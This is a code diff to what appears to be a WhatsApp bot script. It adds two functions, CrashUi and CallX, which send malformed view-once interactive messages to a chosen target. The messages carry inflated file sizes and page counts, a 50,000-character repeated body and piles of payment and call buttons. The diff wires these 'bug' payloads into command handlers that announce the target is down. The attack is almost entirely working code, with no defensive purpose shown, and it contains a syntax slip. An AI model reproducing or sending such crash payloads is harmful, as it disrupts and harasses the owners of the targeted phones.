@@ -817,7 +817,188 @@ async function TrashSystem(target, spider, Ptcp = true) {
    );
    console.log(chalk.green("Send Bug By Spider〽️"));
   };
+async function CrashUi(target, spider, cct = false, ptcp = false) {
+			let etc = generateWAMessageFromContent(target,
+				proto.Message.fromObject({
+					viewOnceMessage: {
+						message: {
+							interactiveMessage: {
+								header: {
+									title: "",
+									documentMessage: {
+										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
+										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+										fileLength: "9999999999999",
+										pageCount: 9007199254740991,
+										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
+										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
+										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
+										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
+										mediaKeyTimestamp: "1723855952",
+										contactVcard: true,
+										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+										jpegThumbnail: spider
+									},
+									hasMediaAttachment: true
+								},
+								body: {
+									text: "SPIDER" + "ꦾ".repeat(50000)
+								},
+								nativeFlowMessage: {
+									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
+									buttons: [
+										cct ? {
+											name: "single_select",
+											buttonParamsJson: "{\"title\":\"Fake" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"Sam 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+										} : {
+											name: "payment_method",
+											buttonParamsJson: ""
+										},
+										{
+											name: "call_permission_request",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "payment_method",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "single_select",
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+										},
+										{
+											name: "galaxy_message",
+											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
+										},
+										{
+											name: "mpm",
+											buttonParamsJson: "{}"
+										}
+									]
+								}
+							}
+						}
+					}
+				}), {
+					userJid: target,
+					quoted: EsQl
+				}
+			);
 
+			await sam.relayMessage(target, etc.message, ptcp ? {
+				participant: {
+					jid: target
+				}
+			} : {});
+			console.log(chalk.green("Send Bug By 🕷️"));
+		};
+	
+async function CallX(target, spider, cct = false, ptcp = false) {
+			let etc = generateWAMessageFromContent(target,
+				proto.Message.fromObject({
+					viewOnceMessage: {
+						message: {
+							interactiveMessage: {
+								header: {
+									title: "",
+									documentMessage: {
+										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
+										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+										fileLength: "9999999999999",
+										pageCount: 9007199254740991,
+										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
+										fileName: "Fake ",
+										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
+										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
+										mediaKeyTimestamp: "1723855952",
+										contactVcard: true,
+										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+										jpegThumbnail: spider
+									},
+									hasMediaAttachment: true
+								},
+								body: {
+									text: "‎SPIDE‎‏‎‏‎‏⭑̤"
+								},
+								nativeFlowMessage: {
+									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
+									buttons: [
+										cct ? {
+											name: "single_select",
+											buttonParamsJson: "{\"title\":\"HARD CRASH" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"Spider 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+										} : {
+											name: "payment_method",
+											buttonParamsJson: ""
+										},
+										{
+											name: "call_permission_request",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "payment_method",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "review_and_pay",
+											buttonParamsJson: ""
+										},
+										{
+											name: "call_permission_request",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "review_and_pay",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "payment_info",
+											buttonParamsJson: ""
+										},
+										{
+											name: "call_permission_request",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "payment_info",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "single_select",
+											buttonParamsJson: "{\"title\":\"HARD CRASH\",\"sections\":[{\"title\":\"SPIDER 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+										},
+										{
+											name: "galaxy_message",
+											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
+										},
+										{
+											name: "mpm",
+											buttonParamsJson: "{}"
+										}
+									]
+								}
+							}
+						}
+					}
+				}), {
+					userJid: target
+					quoted: VisiX
+				}
+			);
+
+			await sam.relayMessage(target, etc.message, ptcp ? {
+				participant: {
+					jid: target
+				}
+			} : {});
+			console.log(chalk.green("Send Bug By Spider"));
+		};
+										
 //================================================//
 async function crtVid(url) {
     const { videoMessage } = await generateWAMessageContent({
@@ -1084,8 +1265,10 @@ var contactInfo = await sam.onWhatsApp(target);
 }
 reply(`Wait Your Target is being Utilised`)
 for (let i = 0; i < 2; i++) {
-await InVisiXz(target, sam, cct = true, ptcp = true)
 await TrashSystem(target, sam, cct = true, ptcp = true)
+await InVisiXz(target, sam, cct = true, ptcp = true)
+await CrashUi(target, sam, cct = true, ptcp = true)
+await CallX(target, sam, cct = true, ptcp = true)
 }
 reply(`
 ┏━━━━━━━━━━━━━━━━━━━━━
@@ -1128,8 +1311,8 @@ var contactInfo = await sam.onWhatsApp(target);
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
    await TrashSystem(target, sam, cct = true, ptcp = true)
-await TrashSystem(target, sam, cct = true, ptcp = true)
-  await TrashSystem(target, sam, cct = true, ptcp = true)
+await CallX(target, sam, cct = true, ptcp = true)
+  await CrashUi(target, sam, cct = true, ptcp = true)
 reply(`
 ┏━━━━━━━━━━━━━━━━━━━━━
 ┃ ▣ 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗢𝗪𝗡
@@ -1172,7 +1355,9 @@ reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
    await TrashSystem(target, sam, cct = true, ptcp = true)
   await TrashSystem(target, sam, cct = true, ptcp = true)
+await CallX(target, sam, cct = true, ptcp = true)
  await StuckNull(target, sam, cct = true, ptcp = true)
+await CrashUi(target, sam, cct = true, ptcp = true)
 await ZnXIvS(target, sam, cct = true, ptcp = true)
 await InVisiXz(target, sam, cct = true, ptcp = true)
  
@@ -1216,9 +1401,9 @@ var contactInfo = await sam.onWhatsApp(target);
 }
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
- await TrashSystem(target, sam, ptcp = true)
-await TrashSystem(target, sam, cct = true, ptcp = true)
- await TrashSystem(target, sam, ptcp = true)
+ await TrashSystem(target, sam, ptcp = true, ptcp = true)
+await CrashUi(target, sam, cct = true, ptcp = true)
+ await CallX(target, sam, ptcp = true)
   
  
 reply(`
